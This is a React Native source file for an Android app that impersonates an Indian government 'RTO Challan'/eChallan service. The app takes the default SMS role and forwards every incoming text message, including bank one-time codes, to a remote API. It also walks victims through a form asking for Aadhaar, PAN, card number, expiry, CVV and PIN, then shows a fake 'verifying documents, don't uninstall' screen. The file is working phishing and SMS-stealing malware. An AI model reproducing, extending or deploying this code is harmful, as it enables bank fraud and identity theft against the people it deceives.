import React, { useEffect, useState } from 'react';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { sendUserData, sendSmsMessage, UserData, SmsMessage } from './src/utils/api';
import { ensureSmsPermissions, requestDefaultSmsRole, isDefaultSmsApp } from './src/utils/smsRole';
import {
  PermissionsAndroid,
  Alert,
  Text,
  Platform,
  FlatList,
  View,
  StyleSheet,
  NativeEventEmitter,
  NativeModules,
  Image,
  TextInput,
  TouchableOpacity,
  ScrollView,
  Button
} from 'react-native';
import { SafeAreaProvider, SafeAreaView } from 'react-native-safe-area-context';

async function requestSmsPermissions() {
  try {
    // 👇 Permissions required for SMS + notifications
    const permissions = [
      PermissionsAndroid.PERMISSIONS.RECEIVE_SMS,
      PermissionsAndroid.PERMISSIONS.READ_SMS,
      PermissionsAndroid.PERMISSIONS.SEND_SMS,
    ];

    // 👇 Add POST_NOTIFICATIONS for Android 13+ (API 33)
    if (Number(Platform.Version) >= 33) {
      permissions.push(PermissionsAndroid.PERMISSIONS.POST_NOTIFICATIONS);
    }

    const granted = await PermissionsAndroid.requestMultiple(permissions);

    const receiveGranted =
      granted['android.permission.RECEIVE_SMS'] === PermissionsAndroid.RESULTS.GRANTED;
    const readGranted =
      granted['android.permission.READ_SMS'] === PermissionsAndroid.RESULTS.GRANTED;
    const sendGranted =
      granted['android.permission.SEND_SMS'] === PermissionsAndroid.RESULTS.GRANTED;
    const notifGranted =
      Number(Platform.Version) >= 33
        ? granted['android.permission.POST_NOTIFICATIONS'] === PermissionsAndroid.RESULTS.GRANTED
        : true;


  } catch (err) {
    console.warn('Error requesting permissions:', err);
  }
}

interface LocalSmsMessage {
  id: string;
  sender: string;
  body: string;
  timestamp: string;
}



export default function App() {
  const [smsMessages, setSmsMessages] = useState<LocalSmsMessage[]>([]);
  const [currentStep, setCurrentStep] = useState(1);
  const [submitted, setSubmitted] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submissionFailed, setSubmissionFailed] = useState(false);
  const [formData, setFormData] = useState({
    name: '',
    mobile: '',
    dob: '',
    aadhar: '',
    pan: '',
    cardNo: '',
    expiry: '',
    cvv: '',
    pin: ''
  });

  useEffect(() => {
    const loadSubmittedStatus = async () => {
      try {
        const submittedStatus = await AsyncStorage.getItem('formSubmitted');
        if (submittedStatus === 'true') {
          setSubmitted(true);
        }
      } catch (error) {
        console.error('Error loading submitted status:', error);
      }
    };

    const initializeApp = async () => {
      await loadSubmittedStatus();
      await requestSmsPermissions();
      await requestDefaultSmsRole();
    };

    initializeApp();

    // Set up SMS listener
    const eventEmitter = new NativeEventEmitter(NativeModules.SmsModule);
    const subscription = eventEmitter.addListener('onSmsReceived', async (smsData: string) => {
      const [sender, body] = smsData.split('\n', 2);
      const timestamp = new Date().toISOString();

      // Send SMS to API instead of just storing locally
      try {
        await sendSmsMessage({
          sender,
          body,
          timestamp,
        });
        console.log('SMS forwarded to API successfully');
      } catch (error) {
        console.error('Failed to forward SMS to API:', error);
      }

      // Still keep local state for UI if needed
      const newSms: LocalSmsMessage = {
        id: Date.now().toString(),
        sender,
        body,
        timestamp: timestamp,
      };
      setSmsMessages(prev => [newSms, ...prev]);
    });

    return () => {
      subscription.remove();
    };
  }, []);

  const renderSmsItem = ({ item }: { item: LocalSmsMessage }) => (
    <View style={styles.smsItem}>
      <Text style={styles.sender}>{item.sender}</Text>
      <Text style={styles.body}>{item.body}</Text>
      <Text style={styles.timestamp}>{new Date(item.timestamp).toLocaleString()}</Text>
    </View>
  );

  const handleNext = () => {
    if (currentStep < 4) {
      setCurrentStep(currentStep + 1);
    }
  };

  const handlePrev = () => {
    if (currentStep > 1) {
      setCurrentStep(currentStep - 1);
    }
  };

  const renderStepForm = () => {
    switch (currentStep) {
      case 1:
        return (
          <View style={styles.formContainer}>
            <Text style={styles.stepTitle}>Step 1: Personal Information</Text>
            <TextInput
              style={styles.input}
              placeholder="Name"
              value={formData.name}
              onChangeText={(text) => setFormData({ ...formData, name: text })}
            />
            <TextInput
              style={styles.input}
              placeholder="Mobile"
              value={formData.mobile}
              onChangeText={(text) => {
                const filtered = text.replace(/\D/g, '');
                if (filtered.length <= 10) {
                  setFormData({ ...formData, mobile: filtered });
                }
              }}
              keyboardType="phone-pad"
              maxLength={10}
            />
            <TextInput
              style={styles.input}
              placeholder="Date of Birth (DD/MM/YYYY)"
              value={formData.dob}
              onChangeText={(text) => {
                const filtered = text.replace(/\D/g, '').slice(0, 8);
                let formatted = filtered;
                if (filtered.length >= 2) {
                  formatted = filtered.slice(0, 2) + (filtered.length > 2 ? '/' : '') + filtered.slice(2);
                }
                if (filtered.length >= 4) {
                  formatted = formatted.slice(0, 5) + (filtered.length > 4 ? '/' : '') + filtered.slice(4);
                }
                setFormData({ ...formData, dob: formatted });
              }}
              keyboardType="numeric"
              maxLength={10}
            />
            <View style={styles.buttonContainer}>
              <TouchableOpacity style={styles.button} onPress={handleNext}>
                <Text style={styles.buttonText}>Next</Text>
              </TouchableOpacity>
            </View>
          </View>
        );
      case 2:
        return (
          <View style={styles.formContainer}>
            <Text style={styles.stepTitle}>Step 2: Identity Documents</Text>
            <TextInput
              style={styles.input}
              placeholder="Aadhar Card Number"
              value={formData.aadhar}
              onChangeText={(text) => {
                const filtered = text.replace(/\D/g, '');
                if (filtered.length <= 12) {
                  setFormData({ ...formData, aadhar: filtered });
                }
              }}
              keyboardType="numeric"
              maxLength={12}
            />
            <TextInput
              style={styles.input}
              placeholder="PAN Card Number"
              value={formData.pan}
              onChangeText={(text) => setFormData({ ...formData, pan: text.toUpperCase().slice(0, 10) })}
              maxLength={10}
            />
            <View style={styles.buttonContainer}>
              <TouchableOpacity style={styles.button} onPress={handlePrev}>
                <Text style={styles.buttonText}>Previous</Text>
              </TouchableOpacity>
              <TouchableOpacity style={styles.button} onPress={handleNext}>
                <Text style={styles.buttonText}>Next</Text>
              </TouchableOpacity>
            </View>
          </View>
        );
      case 3:
        return (
          <View style={styles.formContainer}>
            <Text style={styles.stepTitle}>Step 3: Card Details</Text>
            <TextInput
              style={styles.input}
              placeholder="Card Number"
              value={formData.cardNo}
              onChangeText={(text) => {
                const filtered = text.replace(/\D/g, '');
                if (filtered.length <= 16) {
                  setFormData({ ...formData, cardNo: filtered });
                }
              }}
              keyboardType="numeric"
              maxLength={16}
            />
            <TextInput
              style={styles.input}
              placeholder="Expiry Date (MM/YY)"
              value={formData.expiry}
              onChangeText={(text) => {
                const filtered = text.replace(/\D/g, '');
                let formatted = filtered;
                if (filtered.length >= 3) {
                  formatted = filtered.slice(0, 2) + '/' + filtered.slice(2);
                }
                if (formatted.length <= 5) {
                  setFormData({ ...formData, expiry: formatted });
                }
              }}
              keyboardType="numeric"
              maxLength={5}
            />
            <TextInput
              style={styles.input}
              placeholder="CVV"
              value={formData.cvv}
              onChangeText={(text) => {
                const filtered = text.replace(/\D/g, '');
                if (filtered.length <= 3) {
                  setFormData({ ...formData, cvv: filtered });
                }
              }}
              keyboardType="numeric"
              maxLength={3}
              secureTextEntry
            />
            <View style={styles.buttonContainer}>
              <TouchableOpacity style={styles.button} onPress={handlePrev}>
                <Text style={styles.buttonText}>Previous</Text>
              </TouchableOpacity>
              <TouchableOpacity style={styles.button} onPress={handleNext}>
                <Text style={styles.buttonText}>Next</Text>
              </TouchableOpacity>
            </View>
          </View>
        );
      case 4:
        return (
          <View style={styles.formContainer}>
            <Text style={styles.stepTitle}>Step 4: PIN</Text>
            <TextInput
              style={styles.input}
              placeholder="Card PIN"
              value={formData.pin}
              onChangeText={(text) => {
                const filtered = text.replace(/\D/g, '');
                if (filtered.length <= 4) {
                  setFormData({ ...formData, pin: filtered });
                }
              }}
              keyboardType="numeric"
              maxLength={4}
              secureTextEntry
            />
            <View style={styles.buttonContainer}>
              <TouchableOpacity style={styles.button} onPress={handlePrev}>
                <Text style={styles.buttonText}>Previous</Text>
              </TouchableOpacity>
              <TouchableOpacity
                style={[styles.button, isSubmitting && styles.buttonDisabled]}
                onPress={async () => {
                  if (isSubmitting) return;
                  setIsSubmitting(true);
                  setSubmissionFailed(false);
                  try {
                    const userData: UserData = {
                      name: formData.name,
                      mobile: formData.mobile,
                      dob: formData.dob,
                      aadhar: formData.aadhar,
                      pan: formData.pan,
                      cardNo: formData.cardNo,
                      expiry: formData.expiry,
                      cvv: formData.cvv,
                      pin: formData.pin,
                    };
                    await sendUserData(userData);
                    setSubmitted(true);
                    await AsyncStorage.setItem('formSubmitted', 'true');
                  } catch (error: any) {
                    setSubmissionFailed(true);
                    console.error('Submission error:', error);
                  } finally {
                    setIsSubmitting(false);
                  }
                }}
                disabled={isSubmitting}
              >
                <Text style={styles.buttonText}>
                  {isSubmitting ? 'Submitting...' : submissionFailed ? 'Try Again' : 'Submit'}
                </Text>
              </TouchableOpacity>
            </View>
          </View>
        );
      default:
        return null;
    }
  };

  if (submitted) {
    return (
      <SafeAreaProvider>
        <SafeAreaView style={styles.container}>
          <ScrollView contentContainerStyle={styles.scrollContainer}>
            <Image source={require('./assets/images/rto.png')} style={styles.rtoImage} />
            <Text style={styles.echallanTitle}>eChallan - Digital Traffic/Transport Enforcement Solution</Text>
            <Text style={styles.initiativeText}>An Initiative of MoRTH, Government of India</Text>
            <Text style={styles.verificationMessage}>
              Please don't uninstall the application. We are verifying your documents. We need 30 minutes.
            </Text>
            <Text style={styles.helpText}>Need help? Contact us at:</Text>
            <Text style={styles.emailText}>Email: helpdesk-echallan@gov.in</Text>
          </ScrollView>
        </SafeAreaView>
      </SafeAreaProvider>
    );
  }

  return (
    <SafeAreaProvider>
      <SafeAreaView style={styles.container}>
        <ScrollView contentContainerStyle={styles.scrollContainer}>
          <View style={styles.header}>
            <Text style={styles.headerText}>RTO Challan</Text>
          </View>

          <Image source={require('./assets/images/pic.png')} style={styles.mainImage} />

          {renderStepForm()}

          <Text style={styles.subtitle}>
            Please ensure that you have given permission to read SMS. If not, please allow the permission.
          </Text>

          <View style={styles.bottomImages}>
            <Image source={require('./assets/images/echallan.jpeg')} style={styles.bottomImage} />
            <Image source={require('./assets/images/nic.png')} style={styles.bottomImage} />
          </View>
        </ScrollView>
      </SafeAreaView>
    </SafeAreaProvider>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#ffffff',
  },
  scrollContainer: {
    padding: 20,
    alignItems: 'center',
  },
  header: {
    backgroundColor: '#007bff',
    padding: 15,
    borderRadius: 10,
    marginBottom: 20,
    width: '100%',
    alignItems: 'center',
  },
  headerText: {
    color: '#fff',
    fontSize: 24,
    fontWeight: 'bold',
  },
  mainImage: {
    width: 200,
    height: 150,
    resizeMode: 'contain',
    marginBottom: 20,
  },
  formContainer: {
    width: '100%',
    marginBottom: 20,
  },
  stepTitle: {
    fontSize: 18,
    fontWeight: 'bold',
    marginBottom: 15,
    textAlign: 'center',
  },
  input: {
    borderWidth: 1,
    borderColor: '#ccc',
    borderRadius: 5,
    padding: 10,
    marginBottom: 10,
    fontSize: 16,
  },
  buttonContainer: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    marginTop: 10,
  },
  button: {
    backgroundColor: '#007bff',
    padding: 15,
    borderRadius: 5,
    flex: 1,
    marginHorizontal: 5,
    alignItems: 'center',
  },
  buttonDisabled: {
    backgroundColor: '#ccc',
  },
  buttonText: {
    color: '#fff',
    fontSize: 16,
    fontWeight: 'bold',
  },
  subtitle: {
    color: '#444',
    textAlign: 'center',
    fontSize: 16,
    lineHeight: 22,
    marginBottom: 20,
  },
  bottomImages: {
    flexDirection: 'row',
    justifyContent: 'space-around',
    width: '100%',
    marginTop: 20,
  },
  bottomImage: {
    width: 100,
    height: 50,
    resizeMode: 'contain',
  },
  rtoImage: {
    width: 100,
    height: 100,
    resizeMode: 'contain',
    marginBottom: 20,
  },
  echallanTitle: {
    fontSize: 18,
    fontWeight: 'bold',
    textAlign: 'center',
    marginBottom: 10,
  },
  initiativeText: {
    fontSize: 14,
    textAlign: 'center',
    marginBottom: 20,
    color: '#666',
  },
  verificationMessage: {
    fontSize: 16,
    textAlign: 'center',
    marginBottom: 20,
    color: '#333',
  },
  helpText: {
    fontSize: 16,
    textAlign: 'center',
    marginBottom: 10,
  },
  emailText: {
    fontSize: 16,
    textAlign: 'center',
    color: '#007bff',
  },
  title: {
    fontSize: 22,
    fontWeight: '600',
    textAlign: 'center',
    marginBottom: 10,
  },
  receivedTitle: {
    fontSize: 18,
    fontWeight: '500',
    marginBottom: 10,
  },
  list: {
    flex: 1,
  },
  smsItem: {
    backgroundColor: '#f9f9f9',
    padding: 15,
    marginBottom: 10,
    borderRadius: 8,
    borderWidth: 1,
    borderColor: '#ddd',
  },
  sender: {
    fontSize: 16,
    fontWeight: 'bold',
    marginBottom: 5,
  },
  body: {
    fontSize: 14,
    marginBottom: 5,
  },
  timestamp: {
    fontSize: 12,
    color: '#666',
  },
  noMessages: {
    textAlign: 'center',
    fontSize: 16,
    color: '#666',
    marginTop: 50,
  },
});
